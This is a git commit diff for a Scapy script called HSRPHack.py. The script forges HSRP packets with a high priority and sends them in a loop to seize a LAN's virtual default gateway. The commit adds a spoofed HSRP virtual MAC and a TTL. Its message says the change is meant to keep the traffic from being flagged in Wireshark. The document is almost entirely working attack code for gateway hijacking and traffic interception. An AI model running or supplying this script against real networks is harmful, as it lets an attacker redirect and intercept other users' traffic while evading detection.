65001776af6ddcb532bf681e6604aa83c550914f
wesleychiau <38320889+wesleychiau@users.noreply.github.com>
2022-10-12 14:36:26 +0800

    Updated HSRPhack to be unmarked in wireshark
    Added ethernet header source (source to set to virtual MAC HSRP) and dest
    Added time to live

--- HSRPHack.py
+++ HSRPHack.py
@@ -1,8 +1,9 @@
 from scapy.all import *
 
-ip = IP(src='192.168.1.12', dst='224.0.0.2')
+ether = Ether(src="00:00:0c:07:ac:01", dst="01:00:5e:00:00:02")
+ip = IP(src='192.168.1.12', dst='224.0.0.2', ttl=1)
 udp = UDP(sport=1985,dport=1985)
 hsrp = HSRP(group=1, priority=230, virtualIP='192.168.1.254')
-toSend = ip/udp/hsrp
+toSend = ether/ip/udp/hsrp
 toSend.show()
 send(toSend, iface='eth0', inter=3, loop=1)
